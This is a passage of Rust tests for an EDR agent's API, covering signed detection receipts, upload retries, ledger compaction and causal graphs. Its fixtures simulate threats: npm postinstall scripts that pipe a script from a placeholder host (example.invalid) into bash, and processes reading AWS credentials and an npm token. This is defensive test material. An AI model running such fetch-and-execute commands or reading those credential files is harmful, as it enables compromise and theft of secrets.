            .method("POST")
            .uri("/api/v1/agent/edr/receipts/upload")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(upload_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build receipt upload request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipt upload request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipt upload response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected receipt upload response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipt upload response: {e}"));
        assert_eq!(payload["dryRun"], false);
        assert_eq!(payload["selectedCount"], 1);
        assert_eq!(payload["attempted"], true);
        assert_eq!(payload["accepted"], true);
        assert_eq!(payload["uploadedCount"], 1);
        assert_eq!(payload["httpStatus"], 200);
        assert_eq!(payload["records"][0]["policyName"], "test-edr");
        assert_eq!(
            payload["records"][0]["guard"],
            "supply_chain.install_script.risky"
        );

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(
            request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        let receipt = &request.body["receipts"][0];
        assert_eq!(receipt["verdict"], "deny");
        assert_eq!(receipt["policy_name"], "test-edr");
        assert_eq!(receipt["guard"], "supply_chain.install_script.risky");
        assert_eq!(receipt["public_key"], signer_public_key);
        assert_eq!(receipt["metadata"]["source"], "clawdstrike-agent");
        assert_eq!(
            receipt["signed_receipt"]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "detection"
        );
        assert_eq!(
            receipt["signature"],
            receipt["signed_receipt"]["signatures"]["signer"]
        );

        control_api_task.abort();
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_auto_uploads_signed_receipts_to_control_api() {
        let receipt_path = test_receipt_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_receipts().await;
        let keypair = Keypair::from_seed(&[52u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url);
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key: signer_public_key.clone(),
        }));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));

        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-auto-upload-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/auto.sh | bash".to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            ..EndpointObservation::default()
        };
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "observations": [observation],
                    "honey_artifacts": []
                })
                .to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build auto receipt upload findings: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("auto receipt upload findings failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 2);
        let request = &requests[0];
        assert_eq!(
            request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        let receipt = &request.body["receipts"][0];
        assert_eq!(receipt["public_key"], signer_public_key);
        assert_eq!(receipt["metadata"]["source"], "clawdstrike-agent");
        assert_eq!(
            receipt["signed_receipt"]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "detection"
        );
        let observation_request = &requests[1];
        assert_eq!(
            observation_request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(
            observation_request.body["receipts"][0]["signed_receipt"]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "observation"
        );

        control_api_task.abort();
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn provider_policy_decision_receipts_auto_upload_to_control_api() {
        let receipt_path = test_receipt_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_receipts().await;
        let keypair = Keypair::from_seed(&[54u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url);
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key: signer_public_key.clone(),
        }));
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/network-extension/events",
                post(agent_edr_network_extension_events),
            )
            .with_state(Arc::new(state));

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "ne-policy-upload-1",
                    "observedAt": "2026-05-17T12:05:00Z",
                    "hostId": "host-ne-upload-1",
                    "userId": "user-ne-upload-1",
                    "sessionId": "session-ne-upload-1",
                    "flowId": "flow-policy-upload-1",
                    "sourceAppPath": "/Applications/Agent.app/Contents/MacOS/Agent",
                    "pid": 8080,
                    "processGuid": "proc-ne-policy-upload-1",
                    "host": "blocked-upload.example.invalid",
                    "port": 443,
                    "protocol": "tcp",
                    "verdict": "block",
                    "reason": "staged_policy_block",
                    "policySnapshotHash": "sha256:provider-policy-upload"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/network-extension/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build provider policy-decision upload: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("provider policy-decision upload failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 2);
        let request = requests
            .iter()
            .find(|request| {
                request.body["receipts"][0]["signed_receipt"]["receipt"]["metadata"]
                    ["endpointDecision"]["receiptFamily"]
                    == "policy_decision"
            })
            .unwrap_or_else(|| panic!("missing provider policy-decision upload request"));
        assert_eq!(
            request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        let receipt = &request.body["receipts"][0];
        assert_eq!(receipt["verdict"], "deny");
        assert_eq!(receipt["public_key"], signer_public_key);
        assert_eq!(
            receipt["signed_receipt"]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "policy_decision"
        );
        assert_eq!(
            receipt["signed_receipt"]["receipt"]["metadata"]["endpointDecision"]["sensorState"]
                ["providers"][0]["providerId"],
            "macos.network_extension"
        );

        control_api_task.abort();
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn failed_auto_receipt_upload_is_queued_and_retried() {
        let receipt_path = test_receipt_path();
        let retry_path = test_control_receipt_upload_retry_path();
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_receipts().await;
        *control_api_state.failures_remaining.lock().await = 1;
        let keypair = Keypair::from_seed(&[53u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url);
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: format!("agent-enrollment:{signer_public_key}"),
            signer_public_key,
        }));
        state.edr_control_receipt_upload_retry_ledger = Arc::new(Mutex::new(
            EndpointControlReceiptUploadRetryLedger::open(&retry_path).unwrap_or_else(|err| {
                panic!("failed to open control receipt upload retry ledger: {err}")
            }),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/control-receipt-uploads/retry",
                post(agent_edr_control_receipt_uploads_retry),
            )
            .with_state(Arc::new(state));

        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-auto-upload-retry-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/retry.sh | bash".to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            ..EndpointObservation::default()
        };
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "observations": [observation],
                    "honey_artifacts": []
                })
                .to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build queued receipt upload findings: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("queued receipt upload findings failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        {
            let requests = control_api_state.requests.lock().await;
            assert_eq!(requests.len(), 2);
        }
        let queued = read_control_receipt_upload_retry_ledger(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read receipt upload retry ledger: {err}"));
        assert_eq!(queued.len(), 1);
        assert!(queued[0].receipt_hash.starts_with("0x"));
        assert_eq!(queued[0].last_http_status, Some(503));
        assert_eq!(
            queued[0]
                .payload
                .signed_receipt
                .as_ref()
                .expect("queued payload always carries signed_receipt")
                ["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "detection"
        );

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/control-receipt-uploads/retry")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "force": true, "limit": 10 }).to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build receipt upload retry request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipt upload retry request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipt upload retry response: {e}"));
        let retry_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipt upload retry response: {e}"));
        assert_eq!(retry_payload["attempted"], 1);
        assert_eq!(retry_payload["delivered"], 1);
        assert_eq!(retry_payload["failed"], 0);
        assert_eq!(retry_payload["pending"], 0);
        assert_eq!(retry_payload["attempts"][0]["delivered"], true);

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 3);
        assert_eq!(
            requests[2].api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(
            requests[2].body["receipts"][0]["signed_receipt"]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "detection"
        );
        let retry_json_after = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read delivered receipt retry ledger: {err}"));
        assert_eq!(retry_json_after.trim(), "[]");

        control_api_task.abort();
        let _ = std::fs::remove_file(receipt_path);
        let _ = std::fs::remove_file(retry_path);
    }

    #[tokio::test]
    async fn agent_edr_receipt_compaction_dry_runs_and_prunes_old_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[50u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-receipt-compaction-signer".to_string(),
            signer_public_key,
        }));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .route(
                "/api/v1/agent/edr/receipts/compact",
                post(agent_edr_receipts_compact),
            )
            .with_state(Arc::new(state));

        for package in ["leftpad-one", "leftpad-two"] {
            let observation = EndpointObservation {
                process: EndpointProcess {
                    image: Some("/usr/local/bin/npm".to_string()),
                    signing: CodeSignatureStatus {
                        trust: SignatureTrust::Signed,
                        ..CodeSignatureStatus::default()
                    },
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::PackageScript {
                    manager: PackageManager::Npm,
                    package: Some(package.to_string()),
                    phase: "postinstall".to_string(),
                    script: format!("curl https://example.invalid/{package}.sh | bash"),
                    working_directory: Some("/tmp/pkg".to_string()),
                },
                ..EndpointObservation::default()
            };
            let body = serde_json::json!({
                "observations": [observation],
                "honey_artifacts": []
            });
            let req = axum::http::Request::builder()
                .method("POST")
                .uri("/api/v1/agent/edr/findings")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build receipt compaction findings: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("receipt compaction findings failed: {e}"));
            assert_eq!(response.status(), StatusCode::OK);
        }

        let body = serde_json::json!({
            "maxReceipts": 2,
            "minAgeSeconds": 0,
            "dryRun": true
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/receipts/compact")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build receipt compaction dry-run: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipt compaction dry-run failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipt compaction dry-run: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipt compaction dry-run: {e}"));
        assert_eq!(payload["dryRun"], true);
        assert_eq!(payload["receiptCount"], 4);
        assert_eq!(payload["candidateCount"], 2);
        assert_eq!(payload["removedCount"], 0);
        assert_eq!(payload["records"][0]["family"], "detection");
        assert_eq!(payload["records"][0]["removed"], false);

        let body = serde_json::json!({
            "maxReceipts": 2,
            "minAgeSeconds": 0,
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/receipts/compact")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build receipt compaction request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("receipt compaction request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read receipt compaction response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode receipt compaction response: {e}"));
        assert_eq!(payload["dryRun"], false);
        assert_eq!(payload["removedCount"], 2);
        assert_eq!(payload["retainedCount"], 2);
        assert_eq!(payload["records"][0]["removed"], true);

        let manifest_path = endpoint_receipt_compaction_manifest_path(&receipt_path);
        let manifest_jsonl = std::fs::read_to_string(&manifest_path)
            .unwrap_or_else(|e| panic!("failed to read receipt compaction manifest: {e}"));
        let manifest_lines = manifest_jsonl.lines().collect::<Vec<_>>();
        assert_eq!(manifest_lines.len(), 1);
        let manifest: serde_json::Value = serde_json::from_str(manifest_lines[0])
            .unwrap_or_else(|e| panic!("failed to decode receipt compaction manifest: {e}"));
        assert_eq!(
            manifest["schemaVersion"],
            "clawdstrike.endpoint_receipt_compaction.v1"
        );
        assert_eq!(manifest["preReceiptCount"], 4);
        assert_eq!(manifest["postReceiptCount"], 2);
        assert_eq!(manifest["removed"].as_array().unwrap().len(), 2);
        assert_eq!(manifest["retained"].as_array().unwrap().len(), 2);
        assert!(manifest["preLedgerSha256"]
            .as_str()
            .unwrap()
            .starts_with("0x"));
        assert!(manifest["postLedgerSha256"]
            .as_str()
            .unwrap()
            .starts_with("0x"));
        assert!(manifest["removed"][0]["signedReceiptSha256"]
            .as_str()
            .unwrap()
            .starts_with("0x"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/receipts?family=detection&limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build compacted receipt list request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("compacted receipt list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read compacted receipt list: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode compacted receipt list: {e}"));
        assert_eq!(payload["receipt_count"], 1);
        assert_eq!(
            payload["receipts"][0]["receipt"]["metadata"]["endpointDecision"]["localSequence"],
            3
        );

        let _ = std::fs::remove_file(receipt_path);
        let _ = std::fs::remove_file(manifest_path);
    }

    #[tokio::test]
    async fn agent_edr_receipt_compaction_rejects_unbounded_request() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/receipts/compact",
                post(agent_edr_receipts_compact),
            )
            .with_state(Arc::new(test_state()));
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/receipts/compact")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from("{}"))
            .unwrap_or_else(|e| panic!("failed to build unbounded receipt compaction: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("unbounded receipt compaction failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
    }

    #[tokio::test]
    async fn agent_edr_causal_graph_route_links_observation() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(Arc::new(test_state()));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({ "observations": [observation] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr graph request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read edr graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode edr graph response: {e}"));

        assert!(payload["node_count"].as_u64().unwrap_or_default() >= 2);
        assert!(payload["edge_count"].as_u64().unwrap_or_default() >= 1);
    }

    #[tokio::test]
    async fn agent_edr_causal_graph_route_links_dns_lookup() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(Arc::new(test_state()));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-dns-1".to_string()),
                image: Some("/usr/bin/dig".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::DnsLookup {
                query: "packages.example.invalid".to_string(),
                record_type: Some("A".to_string()),
                answers: vec!["192.0.2.10".to_string()],
                resolver: Some("10.0.0.53".to_string()),
                status: Some("noerror".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({ "observations": [observation] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build DNS graph request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("DNS graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read DNS graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode DNS graph response: {e}"));

        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing graph nodes"))
            .values()
            .any(|node| {
                node["kind"] == "dns_name" && node["label"] == "packages.example.invalid"
            }));
        assert!(payload["graph"]["edges"]
            .as_array()
            .unwrap_or_else(|| panic!("missing graph edges"))
            .iter()
            .any(|edge| edge["kind"] == "resolved_dns"));
    }

    #[tokio::test]
    async fn agent_edr_flight_recorder_reports_recorded_observations() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/flight-recorder",
                get(agent_edr_flight_recorder),
            )
            .with_state(state);
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-recorder-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: clawdstrike_policy_event::edr::FileOperation::Read,
                path: "/Users/alice/.aws/credentials".to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));

        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/flight-recorder")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build flight recorder request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("flight recorder request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read flight recorder response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode flight recorder response: {e}"));

        assert_eq!(payload["observation_count"], 1);
        assert!(payload["node_count"].as_u64().unwrap_or_default() >= 2);
        assert!(payload["edge_count"].as_u64().unwrap_or_default() >= 1);
        assert!(payload["path"].is_null());
    }

    #[tokio::test]
    async fn agent_edr_flight_recorder_compaction_prunes_unprotected_observations() {
        let mut state = test_state();
        let flight_recorder_path = test_flight_recorder_path();
        let receipt_path = test_receipt_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let _ = std::fs::remove_file(&receipt_path);
        let keypair = Keypair::from_seed(&[7u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/flight-recorder",
                get(agent_edr_flight_recorder),
            )
            .route(
                "/api/v1/agent/edr/flight-recorder/compact",
                post(agent_edr_flight_recorder_compact),
            )
            .with_state(Arc::clone(&state));

        let observations = vec![
            EndpointObservation {
                observation_id: "graph-compact-old-network".to_string(),
                process: EndpointProcess {
                    process_guid: Some("proc-graph-compact-old".to_string()),
                    image: Some("/usr/bin/curl".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::NetworkFlow {
                    host: "benign-old.example".to_string(),
                    port: 443,
                    protocol: Some("tcp".to_string()),
                    url: Some("https://benign-old.example/ping".to_string()),
                },
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "graph-compact-protected-secret".to_string(),
                process: EndpointProcess {
                    process_guid: Some("proc-graph-compact-secret".to_string()),
                    image: Some("/usr/bin/node".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::PackageRegistryToken,
                    path: Some("/Users/alice/.npmrc".to_string()),
                    name: Some("npm-token".to_string()),
                },
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "graph-compact-fresh-network".to_string(),
                process: EndpointProcess {
                    process_guid: Some("proc-graph-compact-fresh".to_string()),
                    image: Some("/usr/bin/curl".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::NetworkFlow {
                    host: "fresh.example".to_string(),
                    port: 443,
                    protocol: Some("tcp".to_string()),
                    url: Some("https://fresh.example/ping".to_string()),
                },
                ..EndpointObservation::default()
            },
        ];
        {
            let mut recorder = state.edr_flight_recorder.lock().await;
            recorder
                .append_observations(&[observations[0].clone()])
                .unwrap_or_else(|e| panic!("failed to seed unprotected old observation: {e}"));
        }

        let body = serde_json::json!({
            "observations": [observations[1].clone()],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build graph compaction findings: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("graph compaction findings failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read graph compaction findings: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode graph compaction findings: {e}"));
        assert_eq!(payload["observation_count"], 1);
        assert_eq!(payload["receipt_count"], 2);

        {
            let mut recorder = state.edr_flight_recorder.lock().await;
            recorder
                .append_observations(&[observations[2].clone()])
                .unwrap_or_else(|e| panic!("failed to seed unprotected fresh observation: {e}"));
        }

        let body = serde_json::json!({
            "maxObservations": 1,
            "minAgeSeconds": 0
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/flight-recorder/compact")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build graph compaction dry-run: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("graph compaction dry-run failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read graph compaction dry-run: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode graph compaction dry-run: {e}"));
        assert_eq!(payload["dryRun"], true);
        assert_eq!(payload["observationCount"], 3);
        assert_eq!(payload["candidateCount"], 1);
        assert_eq!(payload["removedCount"], 0);
        assert_eq!(payload["protectedCount"], 1);
        assert_eq!(
            payload["records"][0]["observationId"],
            "graph-compact-old-network"
        );

        let body = serde_json::json!({
            "maxObservations": 1,
            "minAgeSeconds": 0,
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/flight-recorder/compact")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build graph compaction request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("graph compaction request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
